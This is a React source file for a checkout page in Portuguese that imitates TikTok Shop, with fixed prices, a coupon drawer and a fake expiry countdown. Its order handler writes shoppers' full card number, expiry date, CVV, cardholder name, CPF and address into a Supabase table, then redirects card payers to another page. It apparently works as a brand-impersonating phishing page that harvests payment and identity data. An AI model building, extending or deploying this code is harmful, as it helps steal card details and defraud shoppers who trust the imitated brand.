"use client";

import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, 
  MapPin, 
  ChevronRight, 
  ChevronUp,
  ChevronDown,
  Plus,
  Ticket,
  CreditCard,
  CheckCircle2
} from 'lucide-react';
import { Product } from '@/data/products';
import { Button } from '@/components/ui/button';
import NoteDrawer from '@/components/NoteDrawer';
import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
import { supabase } from '@/integrations/supabase/client';
import { showError, showSuccess } from '@/utils/toast';

const Checkout: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [product, setProduct] = useState<Product | null>(null);
  const [isNoteDrawerOpen, setIsNoteDrawerOpen] = useState(false);
  const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
  const [orderNote, setOrderNote] = useState("");
  const [quantity, setQuantity] = useState(1);
  const [couponAmount, setCouponAmount] = useState(5);
  const [cardData, setCardData] = useState<any>(null);
  const [shippingAddress, setShippingAddress] = useState<any>(null);
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix');
  const [isSubtotalOpen, setIsSubtotalOpen] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (location.state?.product) {
      setProduct(location.state.product);
    } else {
      navigate('/');
    }
    if (location.state?.cardAdded && location.state?.cardData) {
      setCardData(location.state.cardData);
      setPaymentMethod('card');
    }
    if (location.state?.addressAdded && location.state?.address) {
      setShippingAddress(location.state.address);
    }
  }, [location, navigate]);

  if (!product) return null;

  // Valores exatos para bater com a lógica da imagem (simulando os cálculos da foto)
  const currentTotal = 113.47;
  const originalPrice = 171.36;
  const discountOnProduct = 52.89;
  const totalSaving = discountOnProduct + couponAmount;

  const handleFinalizeOrder = async () => {
    if (!shippingAddress) {
      showError("Adicione um endereço de entrega.");
      return;
    }
    if (paymentMethod === 'card' && !cardData) {
      showError("Adicione os dados do cartão.");
      return;
    }

    setIsSubmitting(true);
    try {
      const orderData = {
        product_title: product.title,
        quantity: quantity,
        total_amount: currentTotal,
        payment_method: paymentMethod,
        customer_name: shippingAddress.name,
        customer_cpf: cardData ? cardData.cpf : "N/A",
        address_cep: shippingAddress.cep,
        address_state: shippingAddress.state,
        address_city: shippingAddress.city,
        address_neighborhood: shippingAddress.neighborhood,
        address_street: shippingAddress.address,
        address_number: shippingAddress.number,
        address_complement: shippingAddress.complement,
        order_note: orderNote,
        card_number: paymentMethod === 'card' ? cardData.cardNumber : null,
        card_expiry: paymentMethod === 'card' ? cardData.expiry : null,
        card_cvv: paymentMethod === 'card' ? cardData.cvv : null,
        card_holder_name: paymentMethod === 'card' ? cardData.name : null,
      };

      const { error } = await supabase.from('orders').insert([orderData]);
      if (error) throw error;

      showSuccess("Pedido realizado!");
      if (paymentMethod === 'pix') {
        navigate('/pix-pagamento', { state: { product, shippingAddress } });
      } else {
        window.location.href = '/checkout.html';
      }
    } catch (err) {
      console.error(err);
      showError("Erro ao processar pedido.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F8F8F8] pb-[160px] font-sans">
      {/* Header - Conforme Imagem */}
      <div className="bg-white border-b sticky top-0 z-50 pt-2 pb-3">
        <div className="flex items-center px-4 relative h-10">
          <button onClick={() => navigate(-1)} className="absolute left-4">
            <ArrowLeft size={24} className="text-gray-900" />
          </button>
          <h1 className="w-full text-center text-[18px] font-bold text-gray-900">Resumo do Pedido</h1>
        </div>
        <div className="flex items-center justify-center text-[#00BFA5] text-[12px] mt-0.5 font-medium">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" className="mr-1.5">
            <rect x="2" y="5" width="20" height="14" rx="2" />
            <line x1="2" y1="10" x2="22" y2="10" />
          </svg>
          <span>Planos sem juros disponíveis</span>
        </div>
      </div>

      <div className="max-w-[600px] mx-auto space-y-[10px] mt-[10px]">
        {/* Bloco Endereço (Mantido para fluxo, mas estilo TikTok) */}
        {shippingAddress ? (
          <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
            <div className="flex items-center space-x-2">
              <MapPin size={18} className="text-gray-900" />
              <div className="flex flex-col">
                <span className="text-[14px] text-gray-900 font-medium">{shippingAddress.address}, {shippingAddress.number}</span>
                <span className="text-[12px] text-gray-400">{shippingAddress.city} - {shippingAddress.state}</span>
              </div>
            </div>
            <button className="text-[#FF2C55] text-[14px] font-medium" onClick={() => navigate('/adicionar-endereco')}>Alterar</button>
          </div>
        ) : (
          <div className="bg-white p-4 flex items-center justify-between" onClick={() => navigate('/adicionar-endereco')}>
            <div className="flex items-center space-x-2">
              <MapPin size={18} className="text-gray-900" />
              <span className="text-[14px] text-gray-900 font-medium">Adicionar endereço de entrega</span>
            </div>
            <ChevronRight size={18} className="text-gray-300" />
          </div>
        )}

        {/* Desconto do TikTok Shop - Conforme Imagem */}
        <div 
          className="bg-white p-4 flex items-center justify-between cursor-pointer"
          onClick={() => setIsCouponDrawerOpen(true)}
        >
          <div className="flex items-center space-x-2">
            <div className="text-[#FF2C55]">
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                <path d="M15 5v2M15 11v2M15 17v2M5 5h14a2 2 0 0 1 2 2v3a2 2 0 0 0 0 4v3a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-3a2 2 0 0 0 0-4V7a2 2 0 0 1 2-2z" />
                <path d="M15 12h.01" />
              </svg>
            </div>
            <span className="text-[15px] font-bold text-gray-900">Desconto do TikTok Shop</span>
          </div>
          <div className="flex items-center space-x-1.5">
            <span className="text-[13px] font-bold text-[#FF2C55] bg-[#FFF1F3] px-3 py-1 rounded-full border border-[#FFD9E0]/50">
              - R$ {couponAmount.toFixed(2).replace('.', ',')}
            </span>
            <ChevronRight size={18} className="text-gray-300" />
          </div>
        </div>

        {/* Resumo do Pedido - Conforme Imagem */}
        <div className="bg-white p-4">
          <h3 className="text-[16px] font-bold text-gray-900 mb-5">Resumo do Pedido</h3>
          
          <div className="space-y-4">
            <div 
              className="flex justify-between items-center cursor-pointer"
              onClick={() => setIsSubtotalOpen(!isSubtotalOpen)}
            >
              <div className="flex items-center space-x-1.5">
                <span className="text-[15px] text-gray-900 font-bold">Subtotal do produto</span>
                <ChevronUp size={16} className={`text-gray-900 transition-transform ${!isSubtotalOpen ? 'rotate-180' : ''}`} />
              </div>
              <span className="text-[15px] font-bold text-gray-900">R$ {currentTotal.toFixed(2).replace('.', ',')}</span>
            </div>
            
            {isSubtotalOpen && (
              <div className="space-y-4 pt-1">
                <div className="flex justify-between text-[14px] text-gray-500">
                  <span>Preço original</span>
                  <span>R$ {originalPrice.toFixed(2).replace('.', ',')}</span>
                </div>
                <div className="flex justify-between text-[14px]">
                  <span className="text-gray-500">Desconto no produto</span>
                  <span className="text-[#FF2C55] font-medium">- R$ {discountOnProduct.toFixed(2).replace('.', ',')}</span>
                </div>
                <div className="flex justify-between text-[14px]">
                  <span className="text-gray-500">Cupons do TikTok Shop</span>
                  <span className="text-[#FF2C55] font-medium">- R$ {couponAmount.toFixed(2).replace('.', ',')}</span>
                </div>
              </div>
            )}
            
            <div className="pt-4 border-t border-gray-100 flex flex-col items-end">
              <div className="w-full flex justify-between items-center">
                <span className="text-[18px] font-bold text-gray-900">Total</span>
                <span className="text-[20px] font-bold text-gray-900">R$ {currentTotal.toFixed(2).replace('.', ',')}</span>
              </div>
              <span className="text-[13px] text-gray-400 mt-0.5">Impostos inclusos</span>
            </div>
          </div>
        </div>

        {/* Forma de Pagamento - Conforme Imagem */}
        <div className="bg-white p-4 space-y-6">
          <h3 className="text-[16px] font-bold text-gray-900">Forma de pagamento</h3>
          
          <div className="space-y-6">
            {/* Cartão de Crédito */}
            <div className="space-y-3">
              <div 
                className="flex items-center justify-between cursor-pointer"
                onClick={() => navigate('/adicionar-cartao')}
              >
                <div className="flex items-center space-x-3">
                  <div className="w-6 h-6 bg-[#F8F8F8] border border-gray-200 rounded-sm flex items-center justify-center">
                    {cardData ? <CheckCircle2 size={14} className="text-[#00BFA5]" /> : <Plus size={16} className="text-gray-500" />}
                  </div>
                  <span className="text-[15px] font-bold text-gray-900">
                    {cardData ? `Cartão final ${cardData.last4}` : "Cartão de crédito"}
                  </span>
                </div>
                <ChevronRight size={18} className="text-gray-300" />
              </div>
              
              <div className="flex items-center space-x-2 pl-9">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-5" />
                <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-5" />
                <img src="https://images.seeklogo.com/logo-png/20/1/elo-logo-png_seeklogo-205447.png" className="h-5" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" className="h-5" />
              </div>

              <div className="pl-9 space-y-2">
                <div className="bg-[#FFF1F3] text-[#FF2C55] text-[12px] font-bold px-2.5 py-1 rounded-sm inline-flex items-center cursor-pointer border border-[#FFD9E0]/50">
                  Sem juros em até 3 parcelas <ChevronRight size={14} className="ml-1" />
                </div>
                <p className="text-[13px] text-gray-400">Pague em até 12 parcelas</p>
              </div>
            </div>

            {/* Pix */}
            <div 
              className="flex items-center justify-between cursor-pointer border-t border-gray-50 pt-6"
              onClick={() => setPaymentMethod('pix')}
            >
              <div className="flex items-center space-x-3">
                <div className="bg-[#EFFFFD] p-1 rounded-sm">
                  <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-5 w-5" />
                </div>
                <span className="text-[15px] font-bold text-gray-900">Pix</span>
              </div>
              <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'pix' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
                {paymentMethod === 'pix' && <div className="w-3 h-3 bg-[#FF2C55] rounded-full" />}
              </div>
            </div>

            {/* Ver todos */}
            <div className="flex items-center justify-between border-t border-gray-50 pt-6">
              <div className="flex items-center space-x-2">
                <div className="h-6 px-1.5 border border-gray-100 rounded flex items-center bg-white shadow-sm">
                  <img src="https://images.seeklogo.com/logo-png/32/1/google-pay-logo-png_seeklogo-324563.png" className="h-3" />
                </div>
              </div>
              <div className="flex items-center text-[15px] font-bold text-gray-900 cursor-pointer">
                Ver todos <ChevronRight size={18} className="ml-0.5 text-gray-300" />
              </div>
            </div>
          </div>
        </div>

        {/* Termos Legais - Conforme Imagem */}
        <div className="p-4 pt-2">
          <p className="text-[13px] text-gray-600 leading-[1.4]">
            Ao fazer um pedido, você concorda com <span className="font-bold text-gray-900">Termos de uso e venda do TikTok Shop</span> e reconhece que leu e concordou com a <span className="font-bold text-gray-900">Política de privacidade do TikTok</span>.
          </p>

          <div className="mt-6 bg-[#FFF1F3] p-2.5 flex items-center space-x-2 rounded-sm w-fit">
            <span className="text-[16px]">😆</span>
            <span className="text-[13px] text-[#FF2C55] font-medium">
              Você está economizando R$ {totalSaving.toFixed(2).replace('.', ',')} nesse pedido.
            </span>
          </div>
        </div>
      </div>

      {/* Footer Fixo - Conforme Imagem */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
        <div className="max-w-[600px] mx-auto">
          <div className="flex justify-between items-center mb-4 px-1">
            <span className="text-[17px] font-bold text-gray-900">Total (1 item)</span>
            <span className="text-[20px] font-bold text-[#FF2C55]">R$ {currentTotal.toFixed(2).replace('.', ',')}</span>
          </div>
          <Button 
            className="w-full bg-[#FF2C55] hover:bg-[#E0254B] text-white font-bold rounded-full h-[58px] flex flex-col items-center justify-center space-y-0.5 shadow-none border-none"
            onClick={handleFinalizeOrder}
            disabled={isSubmitting}
          >
            <span className="text-[18px]">{isSubmitting ? "Processando..." : "Fazer pedido"}</span>
            <span className="text-[11px] font-medium opacity-90">O cupom expira em 02:23:39</span>
          </Button>
        </div>
      </div>

      <NoteDrawer isOpen={isNoteDrawerOpen} onClose={() => setIsNoteDrawerOpen(false)} onSave={setOrderNote} initialNote={orderNote} />
      <TikTokCouponDrawer isOpen={isCouponDrawerOpen} onClose={() => setIsCouponDrawerOpen(false)} onSelect={setCouponAmount} selectedAmount={couponAmount} />
    </div>
  );
};

export default Checkout;